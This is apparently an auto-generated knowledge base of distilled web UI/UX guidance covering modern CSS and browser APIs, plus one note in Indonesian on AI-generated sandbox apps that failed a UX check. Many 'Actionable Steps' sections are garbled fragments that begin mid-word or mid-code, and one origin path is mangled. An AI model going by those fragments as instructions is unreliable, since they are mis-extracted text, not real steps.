  /* Define the container type. Use 'inline-size' for width-based scaling. */
  /* You can also use 'size' for both width and height, but it requires explicit sizing. */
  container-type: inline-size;
  
  /* Optional: Name the container for specific targeting */
  container-name: fluid-card;
}
```



Use container query units (`cqi`, `cqb`, etc.) to set sizes relative to the container's dimensions.

*   `cqi`: 1% of the container's inlin...

#### 🔗 Traceability:
- [Source Context](NEXUS_FLUID-SCALING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Auto-sizing form controls
> **Origin**: `ui-ux/NEXUS_FORM-FIELDS-AUTOMATICALLY-FIT-CONTENTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

By default, form controls like `<input>`, `<textarea>`, and `<select>` have fixed dimensions. Their sizes remain constant, regardless of the amount of content the user enters or selects.

To allow these controls to automatically shrink or grow to fit their content (including placeholders), use the `field-sizing: content` CSS property.



Setting `field-sizing: content` on inputs, selects, or textareas allows them to resize dynamically as the user types or selects options. However, you must account for inherited styling, layout defaults, and minimum/maximum constraints to ensure a robust user experience.

To prevent layout issues, it is recommended to set both `min-inline-size` (or `min-width`) and `max-inline-size` (or `max-width`) alongside `field-sizing: content` on text inputs. A minimum size prevents the input from collapsing to a width of zero when empty (making it unclickable), and a maximum size ensures it doesn't expand indefinitely and break the page layout.

For textareas, allowing horizontal auto-sizing can cause a jarring UX (e.g., a textarea with a long placeholder will abruptly shrink horizontally when the us...

#### 🔗 Traceability:
- [Source Context](NEXUS_FORM-FIELDS-AUTOMATICALLY-FIT-CONTENTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation steps
> **Origin**: `ui-ux/NEXUS_GROUP-ELEMENT-TRANSITIONS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

As items are added or removed from a list, or rearranged, transitions can help users maintain context. View transitions provide a way to transition between two states of an element by giving the element a unique `view-transition-name`. When multiple elements on a page share the same transition behavior, `view-transition-class` allows you to define that logic once in CSS rather than repeating it for every unique `view-transition-name`. This keeps your stylesheets maintainable while ensuring consistent animations across a group of elements.



1. **Assign unique names and a shared class**

Each element that needs to be tracked individually during a transition must have a unique `view-transition-name`.

```html
<!-- Mandatory: Each element must have a unique view-transition-name -->
<li style="view-transition-name: item-1" class="item">Item 1</li>
<li style="view-transition-name: item-2" class="item">Item 2</li>
```

To apply shared styles, also assign a `view-transition-class`.

```css
.item {
  view-transition-class: list-item;
}
```

2. **Define the shared transition logic**
   
Use the `::view-transition-gro...

#### 🔗 Traceability:
- [Source Context](NEXUS_GROUP-ELEMENT-TRANSITIONS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Identify heavy-running JavaScript
> **Origin**: `ui-ux/NEXUS_IDENTIFY-HEAVY-SCRIPTS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions.

The Long Animation Frames API is a lightweight API that can be used to identify heavy-running JavaScript in the field. A heavy-running script can be either a single long-running script, or a script that runs multiple times during the page lifecycle.

#### 🔗 Traceability:
- [Source Context](NEXUS_IDENTIFY-HEAVY-SCRIPTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Identify causes of poor INP
> **Origin**: `ui-ux/NEXUS_IDENTIFY-INP-CAUSES.MD` | **Distilled At**: 26/05/2026

#### 🧐 Core Insights (Distilled):
insights for JavaScript code delaying an interaction. A full performance trace using the JS Self-Profiling API is a heavyweight solution that is liable to cause performance problems. The Long Animation Frames API is a lightweight API that can be used to identify slow running JavaScript in the field for INP interactions.

#### 🛠 Actionable Steps:
actions leads to a poor impression of a page being slow or even completely broken. Interaction to Next Paint (INP) is a metric based on the Event Timing API. It measures the worst interaction (minus some outliers) as a measure of the page's responsiveness.

Identifying root causes of an unresponsive web page can be tricky especially as it depends on user interactions and environmental conditions such as device capabilities and network conditions. This makes it even more difficult to diagnose compared to a more repeatable and predictable scenario like page load. Lab data only replicates a small subset of real user scenarios so measuring the causes of slow INP in the field is essential.

The Event Timing API allows for splitting the INP duration into three subparts: Input Delay (processi

#### 🔗 Traceability:
- [Source Context](NEXUS_IDENTIFY-INP-CAUSES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Improve next page load performance
> **Origin**: `ui-ux/NEXUS_IMPROVE-NEXT-PAGE-LOAD-[PERFORMANCE.MD](../ui-ux/NEXUS_PERFORMANCE.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



One of the most effective ways to improve page load performance for users navigating a site is to initiate loading the next page they're about to visit *before* they visit it. This can be done through a technique called speculative loading using the Speculation Rules API.



Speculative loading works by using JSON-based speculation rules to tell the browser about links that can be prefetched or prerendered improving page load performance when user clicks on them.

The rules can either be a hardcoded list of URLs a `urls` key (known as a list rule), or with a `where` key containing a set of href and CSS selectors used to find links on the page (known as a `document` rule).

Rules can also include an optional `eagerness` property that specifies when the page should be prefetched or prerendered. The `eagerness` property can be set to `immediate`, `eager`, `moderate`, or `conservative`. `immediate` speculates as soon as possible, while the others wait for user signals such as hovering for a short period, for a longer period, or starting to click on the page respectively.

Rules can be combined with different eagerness setti...

#### 🔗 Traceability:
- [Source Context](NEXUS_IMPROVE-NEXT-PAGE-LOAD-[PERFORMANCE.MD](../ui-ux/NEXUS_PERFORMANCE.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Improve Text Layout and Legibility
> **Origin**: `ui-ux/NEXUS_IMPROVE-TEXT-LAYOUT-AND-LEGIBILITY.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action with Width:** `text-wrap: balance` does not change the container's width (`inline-size`). It only affects how text wraps *within* that width. This can leave empty space at the end of the container, which may affect layouts relying on full-width text blocks.

#### 🔗 Traceability:
- [Source Context](NEXUS_IMPROVE-TEXT-LAYOUT-AND-LEGIBILITY.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Key Implementation Details
> **Origin**: `ui-ux/NEXUS_INDIVIDUAL-TRANSFORM-PROPERTIES.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

The `transform` property allows you to apply multiple transformations in a specified order, but any changes to a single transformation require re-specifying the entire transformation chain. This makes it tricky to animate or transition a single transformation.

The individual CSS transform properties (`translate`, `rotate`, and `scale`) allow you to apply transformations independently of the `transform` property. This approach makes it simpler to override a single transformation, for instance on `:hover`.



Individual transform properties are always applied in a **fixed order**, regardless of their order in your CSS:
1. `translate`
2. `rotate`
3. `scale`
4. `transform` (applied last)

If you require a different order (e.g., scaling *before* rotating), you must continue using the `transform` property functions.

Transform functions do not override the individual transform properties. In other words, `scale: 2; transform: scale(3);` will first scale by 2x, then again by 3x, for a total of 6x.



The `transform` property and individual transform properties impact the layout and rendering of the page and may cause une...

#### 🔗 Traceability:
- [Source Context](NEXUS_INDIVIDUAL-TRANSFORM-PROPERTIES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Optimizing Interactions in Complex Layouts
> **Origin**: `ui-ux/NEXUS_INTERACTIONS-IN-COMPLEX-LAYOUTS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions in Complex Layouts
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Maintain high frame rates (60FPS) and eliminate interaction latency during drag-and-drop or heavy mutations in complex, multi-column layouts like Kanban boards or massive data grids.

#### 🔗 Traceability:
- [Source Context](NEXUS_INTERACTIONS-IN-COMPLEX-LAYOUTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Enable interactive HTML content in 3D scenes
> **Origin**: `ui-ux/NEXUS_INTERACTIVE-CONTENT-IN-3D-SCENES.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
Action</button>
  </div>
</canvas>

<script>
  const canvas = document.getElementById("canvas");
  const gl = canvas.getContext("webgl");
  const uiElement = document.getElementById("ui-element");

  // Setup WebGL texture...
  const texture = gl.createTexture();
  gl.bindTexture(gl.TEXTURE_2D, texture);

  canvas.onpaint = () => {
    // 1. Update texture with HTML content
    if (gl.texElementImage2D) {
      gl.texElementImage2D(
        gl.TEXTURE_2D,
        0,
        gl.RGBA,
        gl.RGBA,
        gl.UNSIGNED_BYTE,
        uiElement,
      );
    }

    // ... Render your 3D scene here, calculating htmlElementMVP matrix ...

    // 2. Sync DOM position with 3D scene
    if (canvas.getElementTransform) {
      const mvpDOM = new DOMMatrix(Array.from(h

#### 🔗 Traceability:
- [Source Context](NEXUS_INTERACTIVE-CONTENT-IN-3D-SCENES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation
> **Origin**: `ui-ux/NEXUS_INTERACTIVE-CONTENT-REVEAL.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action */
.reveal-layer:hover {
  --inner-size: 100px;
  --outer-size: 120px;
}  
```

#### 🔗 Traceability:
- [Source Context](NEXUS_INTERACTIVE-CONTENT-REVEAL.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Show a tooltip when hovering
> **Origin**: `ui-ux/NEXUS_INTEREST-TRIGGERED-TOOLTIPS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action an icon-only button will take, or provide additional form field guidance.

#### 🔗 Traceability:
- [Source Context](NEXUS_INTEREST-TRIGGERED-TOOLTIPS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Key Use Cases
> **Origin**: `ui-ux/NEXUS_LANGUAGE-DETECTION.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

The **Language Detector API** is a client-side web API designed to identify the language of a given text string. By performing detection locally in the browser, it enhances user privacy and reduces the need for heavy external libraries or costly server-side calls.



- **Translation Prep:** Identifying the source language before sending text to a translator.
- **Safety & Filtering:** Loading specific models for tasks like toxicity detection.
- **Accessibility:** Labeling content with the correct `lang` attribute for screen readers.
- **UI Localization:** Adjusting application interfaces based on the user's input language.



- **OS:** Windows 10/11, macOS 13+, Linux, or Chromebook Plus.
- **Storage:** 22 GB free space (model is removed if space drops below 10 GB).
- **RAM/CPU:** 16 GB RAM and 4+ CPU cores.
- **VRAM:** 4 GB+ if using a GPU.





Check model availability before attempting to instantiate the detector or trigger download.

**MANDATORY:** Instantiating the language detector or triggering a model download with `LanguageDetector.create()` **MUST** be initiated by a user gesture (such as a button click...

#### 🔗 Traceability:
- [Source Context](NEXUS_LANGUAGE-DETECTION.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation
> **Origin**: `ui-ux/NEXUS_LIGHT-DISMISS-A-DIALOG.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Modern modal dialogs often support "light-dismiss," allowing users to close a dialog by clicking or tapping the backdrop (the area outside the dialog). The `closedby` attribute provides a declarative way to enable this behavior without custom JavaScript.



To enable light-dismiss:

1. Add `closedby="any"` to the `<dialog>` element.
2. Open the dialog using `dialog.showModal()`.



- `any`: Enables light-dismiss (clicking the backdrop), "close requests" (the `Esc` key), and developer mechanisms (e.g., `dialog.close()`).
- `closerequest`: Enables "close requests" and developer mechanisms only. This is the default for modal dialogs.
- `none`: Only developer mechanisms can close the dialog.


When a dialog is opened as a modal using `showModal()`, the browser generates a `::backdrop` pseudo-element. This backdrop covers the entire viewport and sits directly behind the dialog.

```css
/* Style the backdrop to indicate the dialog is modal */
dialog::backdrop {
  background-color: rgba(0, 0, 0, 0.5);
  backdrop-filter: blur(2px); /* Optional: add blur for modern browsers */
}
```



```html
<!-- MANDATORY: Use...

#### 🔗 Traceability:
- [Source Context](NEXUS_LIGHT-DISMISS-A-DIALOG.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Modeling Partial Time Concepts with Temporal
> **Origin**: `ui-ux/NEXUS_MODEL-PARTIAL-TIME-CONCEPTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Modeling date concepts that lack a full calendar date—such as credit card expirations, annual renewals, or daily alarms—has historically been error-prone with the legacy `Date` object. Developers often resort to using arbitrary days (like the 1st of the month) or parsing strings, leading to "day leakage" or incorrect calculations due to leap years and varying month lengths.

The `Temporal` API provides dedicated types for these partial concepts: `Temporal.PlainYearMonth`, `Temporal.PlainMonthDay`, and `Temporal.PlainTime`. These types ensure precision and avoid leaking irrelevant date components.




Use `Temporal.PlainYearMonth` to represent a year and a month.

```javascript
// Create a PlainYearMonth from values
// Use explicit calendar to avoid mismatch issues in polyfill environments
const expiry = Temporal.PlainYearMonth.from({ year: 2027, month: 12, calendar: 'iso8601' });

// Get the current year/month
const currentMonth = Temporal.Now.plainDateISO().toPlainYearMonth();

// Calculate duration until expiry
// largestUnit ensures the difference is expressed in years if applicable
const duration = currentM...

#### 🔗 Traceability:
- [Source Context](NEXUS_MODEL-PARTIAL-TIME-CONCEPTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Moving an element with state
> **Origin**: `ui-ux/NEXUS_MOVE-DOM-ELEMENT-WITHOUT-LOSING-STATE.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

When reparenting DOM elements using traditional methods like `appendChild()` or `insertBefore()`, the browser implicitly removes the element from the DOM and then inserts it into its new location. This "remove and insert" operation resets many internal states, causing `<iframe>` elements to reload, CSS animations to restart, and input fields to lose focus.

To move an element while preserving its state, use the `moveBefore()` API. This method performs an atomic move, completely bypassing the removal and insertion steps.



Use `moveBefore()` exactly as you would use `insertBefore()`. It requires two arguments: the node to move, and a reference node to insert before (or `null` to append to the end of the new parent).

```javascript
const newParent = document.getElementById('new-parent');
const elementWithState = document.getElementById('iframe-or-focused-input');

// MANDATORY: Use moveBefore to preserve state. 
// Passing null as the second argument appends the element to the end of newParent.
newParent.moveBefore(elementWithState, null);
```



If you are moving custom elements using `moveBefore()`, their `connec...

#### 🔗 Traceability:
- [Source Context](NEXUS_MOVE-DOM-ELEMENT-WITHOUT-LOSING-STATE.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Omnibox Integration
> **Origin**: `ui-ux/NEXUS_OMNIBOX.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action=opensearch&search=${encodeURIComponent(text)}&limit=5&format=json`
    );
    const [, titles, , urls] = await response.json();

    const suggestions = titles.map((title, i) => ({
      content: urls[i],
      description: `${title} - <url>${urls[i]}</url>`
    }));

    suggest(suggestions);
  } catch (err) {
    console.error('Search failed:', err);
  }
});
```

#### 🔗 Traceability:
- [Source Context](NEXUS_OMNIBOX.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overflow Clipping Control
> **Origin**: `ui-ux/NEXUS_OVERFLOW-CLIPPING-CONTROL.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action logic.
- **DO** configure `overflow-clip-margin` with a specified length offset when applying external visual effects (like `filter: drop-shadow()`) to prevent sharp bounding box truncation without altering or expanding layout geometry.
- **DO NOT** apply `overflow: clip` if the container requires programmatic scroll manipulation via JavaScript or serves as the immediate layout context for `position: sticky` elements, as `clip` completely disables scrolling.

#### 🔗 Traceability:
- [Source Context](NEXUS_OVERFLOW-CLIPPING-CONTROL.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Critical Rendering Path (CRP) Optimization
> **Origin**: `ui-ux/NEXUS_PERFORMANCE.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action to Next Paint (INP) & Main Thread Unblocking

INP measures the latency of all interactive events across the page's lifecycle. Poor INP is caused by long-running JavaScript tasks blocking the main thread.

#### 🔗 Traceability:
- [Source Context](NEXUS_PERFORMANCE.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation Steps
> **Origin**: `ui-ux/NEXUS_PHYSICS-BASED-EASING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Traditional CSS easing functions like `ease-in` or `cubic-bezier()` are limited to simple curves, making it impossible to create complex physics-based effects like bounces or springs. The `linear()` timing function solves this by allowing you to provide a series of stops that can approximate complex curves. Transitions and animations are interpolated based on straight lines between the stops, but within enough stops, it can appear smooth.



1.  **Generate the curve stops:**
    Manually plotting dozens of points for a spring or bounce is impractical. Use a timing function from an external library, or use a  tool to convert an existing JavaScript easing function or an SVG path into the `linear()` syntax. Optional: store these timing functions as CSS custom properties for reuse throughout your site.
2.  **Define the timing function:**
    Apply the generated stops to the `transition-timing-function` or `animation-timing-function` property, or through the `transition` or `animation` shorthands.
3.  **Adjust the duration:**
    Unlike JavaScript physics engines where duration is derived from physical properties (mass, stiffnes...

#### 🔗 Traceability:
- [Source Context](NEXUS_PHYSICS-BASED-EASING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Fallback strategies
> **Origin**: `ui-ux/NEXUS_PLATFORM-CONTROLS-DISMISS-DIALOG.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

When a modal dialog is open, users expect to use familiar controls to dismiss them: pressing the <kbd>Esc</kbd> key on a keyboard, using the back button or gesture on mobile platforms, or a dismiss gesture with assistive technologies.

When the `<dialog>` element was first introduced, it could be dismissed with the <kbd>Esc</kbd> key, but not other platform controls such as a back button/gesture on mobile. With the addition of the `closedby` attribute for `<dialog>` elements, the extended behavior of responding to more platform-specific controls for close requests has been applied for `<dialog>` elements that are opened in a modal state (i.e. when opened imperatively with the `<dialog>` element’s `showModal()` method in JavaScript or declaratively with the `show-modal` invoker command). So, there is no specific change developers need to make if they are already using the `<dialog>` element.

```html
<!-- MANDATORY: must be opened with either `showModal()` with JavaScript or the `show-modal` command using declarative command invokers in order respond to close requests including platform-specific controls. -->
<dialog aria-label...

#### 🔗 Traceability:
- [Source Context](NEXUS_PLATFORM-CONTROLS-DISMISS-DIALOG.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Precise Text Alignment
> **Origin**: `ui-ux/NEXUS_PRECISE-TEXT-ALIGNMENT.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026





Browsers automatically add extra whitespace above and below text characters to accommodate line-height and font-specific metrics like ascenders and descenders. This "ghost space" makes it impossible to achieve pixel-perfect vertical alignment using standard CSS.

Common issues include:
- **Misaligned Icons**: Text appears visually lower or higher than an adjacent icon even when using `align-items: center`.
- **Inaccurate Padding**: A button with `padding: 12px` visually appears to have more space on top or bottom because of the font's internal leading.
- **Flush Alignment**: You cannot align the top of a capital letter exactly with the top of a container or an adjacent image without using "magic number" negative margins.



The `text-box-trim` and `text-box-edge` properties (shorthand `text-box`) allow you to trim this internal leading based on specific font metrics. By trimming the text box to the **cap-height** (top of capital letters) and the **alphabetic baseline** (bottom of most letters), you can ensure that the element's bounding box matches its visual content.



1. **MANDATORY**: Apply `text-box-trim: tr...

#### 🔗 Traceability:
- [Source Context](NEXUS_PRECISE-TEXT-ALIGNMENT.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Prevent text wrapping
> **Origin**: `ui-ux/NEXUS_PREVENT-TEXT-WRAPPING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Modern CSS provides the `text-wrap` property to control how text breaks within its container. To ensure text stays on a single line and ignores container boundaries, use `text-wrap: nowrap`. This is the modern, more semantic replacement for `white-space: nowrap`.

Preventing text wrapping is useful for UI elements like navigation tabs, horizontal scrolling chips, or any scenario where a line break would break the layout or visual design.





To prevent any automatic line breaks, apply `text-wrap: nowrap` to the element containing the text.

1. **MANDATORY**: Apply `text-wrap: nowrap` to the target element.
2. **OPTIONAL**: Use an `overflow` property (such as `hidden`, `scroll`, or `auto`) to manage the resulting overflow.
3. **OPTIONAL**: Use `text-overflow: ellipsis` to provide a visual cue when text is truncated. Note: This requires `overflow: hidden`.



```css
.no-wrap-text {
  /* MANDATORY: Prevents automatic line breaks */
  text-wrap: nowrap;

  /* OPTIONAL: Handles the overflow visually */
  overflow: hidden;
  text-overflow: ellipsis;

  /* OPTIONAL: Constrain width to force and handle overflow ...

#### 🔗 Traceability:
- [Source Context](NEXUS_PREVENT-TEXT-WRAPPING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Pull to Reveal
> **Origin**: `ui-ux/NEXUS_PULL-TO-REVEAL.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



"Pull to reveal" is a UI pattern where content (such as a search bar or refresh control) is hidden above the top of a scrollable area on initial load, and the user can pull down (scroll up) to reveal it. This pattern is commonly used in mobile apps and web apps for search bars, filters, and other secondary controls that should be accessible but not immediately visible.

The CSS property `scroll-initial-target` offers a declarative, CSS-only way to implement this pattern. By setting `scroll-initial-target: nearest` on the main content element, the scroll container will render with the hidden content scrolled out of view. Previously, developers relied on JavaScript (`Element.scrollIntoView()`) or URL fragment identifiers (`#content-id`) to achieve this, both of which have limitations and are tricky to implement.



To implement a pull-to-reveal pattern:

1. **Ensure a scroll container:** The target element must be inside a scroll container (an element with overflow that allows scrolling, such as `overflow: auto`). This can be any ancestor element, including the root `<html>` element.
2. **Define the hidden element:** Place...

#### 🔗 Traceability:
- [Source Context](NEXUS_PULL-TO-REVEAL.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Reduce Style Repetition with CSS Functions
> **Origin**: `ui-ux/NEXUS_REDUCE-STYLE-REPETITION.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Maintaining large stylesheets often leads to repetitive logic, especially when dealing with design system tokens like gradients or responsive layout patterns.

The CSS `@function` at-rule allows you to encapsulate this logic into reusable, parameterized functions, making your CSS more maintainable, consistent and DRY (Don't Repeat Yourself).



A custom function is defined using the `@function` rule followed by a dashed name and a list of parameters. The function returns a value using the `result` property. 

```css
@function --my-function(--input1 <length>, --input2: default-value) returns <length> {
  /* Logic goes here */
  result: var(--input1);
}
```


- **Parameters:** Must start with a double dash (`--`).
- **Defaults:** You can provide default values using a colon (`:`).
- **Result:** The `result` property determines the value the function returns. The last `result` declared in the function body wins.
- **Scoping:** Parameters and variables defined inside the function are locally scoped.
- **Types:** You can require parameters and the returned value to match a CSS type with bracket notation (e.g., `<co...

#### 🔗 Traceability:
- [Source Context](NEXUS_REDUCE-STYLE-REPETITION.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Required Field Feedback
> **Origin**: `ui-ux/NEXUS_REQUIRED-FIELD-FEEDBACK.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action state using a `WeakMap`. This avoids polluting the DOM with "dirty" classes or data attributes.

```javascript
const UserInvalidFallback = (() => {
  const dirtyState = new WeakMap();

  const updateState = (input) => {
    const isValid = input.checkValidity();

    // Update both visual and ARIA state
    input.classList.toggle('user-invalid-fallback', !isValid);
    input.classList.toggle('user-valid-fallback', isValid);

    if (!isValid) {
      input.setAttribute('aria-invalid', 'true');
    } else {
      input.removeAttribute('aria-invalid');
    }
  };

  const handleEvent = (event) => {
    const input = event.target;

    if (event.type === 'reset') {
      const controls = input.elements || [];
      for (const control of controls) {
        dir

#### 🔗 Traceability:
- [Source Context](NEXUS_REQUIRED-FIELD-FEEDBACK.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Rich Media Picker (Customizable Select)
> **Origin**: `ui-ux/NEXUS_RICH-MEDIA-PICKER.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The native `<select>` element was historically difficult to style and could only contain plain text options. The `appearance: base-select` property offers a declarative, CSS-only way to opt into a customizable state for the `<select>` element. This allows developers to include rich HTML content—such as images, SVGs, and complex layouts—inside `<option>` elements, while retaining native keyboard accessibility and form integration. Use this pattern to replace heavy, custom-built select components with standard, native elements.



To implement a rich media picker using the Customizable Select API:

1. **Opt-in to base styles**: Apply `appearance: base-select` to both the `<select>` element and its internal picker using the `::picker(select)` pseudo-element. This changes the browser's HTML parser for the contents inside the `<select>`.
2. **Define the Button Content**: Use standard `<button>` and `<selectedcontent>` elements inside the `<select>` to define what is shown when the picker is closed. The `<selectedcontent>` element automatically mirrors the content of the selected option. This is required if you want to display t...

#### 🔗 Traceability:
- [Source Context](NEXUS_RICH-MEDIA-PICKER.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Sandbox UI/UX Distilled Findings
> **Origin**: `ui-ux/NEXUS_SANDBOX_UI_FINDINGS.md` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 25/05/2026



**Date**: 2026-05-23
**Context**: NEXUS Sandbox Section 1 generated 11 TALL Stack web applications, all of which failed the UX/UI quality check. The resulting applications were merely default Laravel boilerplate pages with haphazardly injected Livewire components.


1. **Broken Boilerplate**: Agen tidak menghapus halaman dokumentasi bawaan Laravel (`welcome.blade.php` dengan link ke Laracasts/Laravel News). Hal ini membuat aplikasi terlihat seperti *scaffold* awal, bukan produk akhir (MVP).
2. **Missing Application Shell**: Tidak ada satupun aplikasi yang menggunakan struktur `layouts/app.blade.php`. Akibatnya, aplikasi tidak memiliki *navbar*, *footer*, navigasi, atau kerangka UI (Shell) yang layak.
3. **Mangled HTML Injection**: Karena struktur HTML yang kacau, injeksi tag `<livewire:...>` malah merusak *tag* `<body>` dan `<div>`.


Untuk generasi kode selanjutnya (terutama agen `ux-engineer` dan `pipeline-architect`), **patuhi aturan ketat berikut**:

1. **Wajib Hapus Boilerplate**: Setiap kali membuat aplikasi baru, halaman bawaan `welcome.blade.php` **HARUS DIHAPUS TOTAL** isinya dan diganti dengan desain halaman depan/Dashbo...

#### 🔗 Traceability:
- [Source Context](NEXUS_SANDBOX_UI_FINDINGS.md)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Scheduling tasks by priority
> **Origin**: `ui-ux/NEXUS_SCHEDULE-TASKS-BY-PRIORITY.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action (e.g., input handling, critical rendering).
- `user-visible`: Tasks visible to the user but not blocking (default).
- `background`: Tasks that are not time-critical (e.g., analytics, prefetching).

```javascript
// Schedule a high-priority task that blocks user interaction
scheduler.postTask(() => {
  // DO: Handle critical updates that impact user interaction
  handleCriticalUpdate();
}, { priority: 'user-blocking' });

// Schedule a default priority task
scheduler.postTask(() => {
  // DO: Render non-critical content that is visible to the user
  renderSecondaryContent();
}); // Defaults to 'user-visible'

// Schedule a low-priority background task
scheduler.postTask(() => {
  // DO: Perform heavy background work that is not time-critical
  sendAnalytics();
},

#### 🔗 Traceability:
- [Source Context](NEXUS_SCHEDULE-TASKS-BY-PRIORITY.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Set a scroll target for the initial render
> **Origin**: `ui-ux/NEXUS_SCROLL-TARGET-ON-LOAD.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The CSS property `scroll-initial-target` offers a declarative, CSS-only way to bring a specific descendant element into the visible area of its scroll container as soon as that container is rendered. Previously, developers relied on JavaScript (`Element.scrollIntoView()`) or URL fragment identifiers (`#item-id`), both of which have limitations and are tricky to implement.



To implement this successfully:

1. **Ensure a scroll container:** The target element must be inside a scroll container (an element with overflow that allows scrolling, such as `overflow: auto`). This can be any ancestor element, including the root `<html>` element.
2. **Target the Item:** Apply `scroll-initial-target: nearest` to the specific descendant element you want to bring into view.



In this example, a feed starts scrolled to a specific "featured" item rather than the very top of the list.

```css
/** 
 * TARGET: The item that should be visible on initial load.
 */
.item.target {
  scroll-initial-target: nearest;
}
```



- **DO** use `scroll-initial-target` for "middle-start" experiences, such as a calendar starting on the c...

#### 🔗 Traceability:
- [Source Context](NEXUS_SCROLL-TARGET-ON-LOAD.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Select Menu Interaction
> **Origin**: `ui-ux/NEXUS_SELECT-MENU-INTERACTION.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action
> **VERSION**: v1 | **Last Updated**: 26/05/2026

#### 🔗 Traceability:
- [Source Context](NEXUS_SELECT-MENU-INTERACTION.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_SHAPED-CUTOUTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026


CSS Masking allows you to clip an element to a custom shape, such as adding a notch to a card or creating a shaped border. When combining shapes for complex layouts, choose your masking strategy based on the type of content the element contains:

| Masking strategy                | Best For                        | Text Impact                    |
| ------------------------------- | ------------------------------- | ------------------------------ |
| Direct Element SVG Masking      | Images, Icons, Decorative shapes, Complex shapes | Not recommended (can crop text) |
| Adjacent Element SVG Masking    | Cards with Text, Crucial content | Text remains fully readable    |
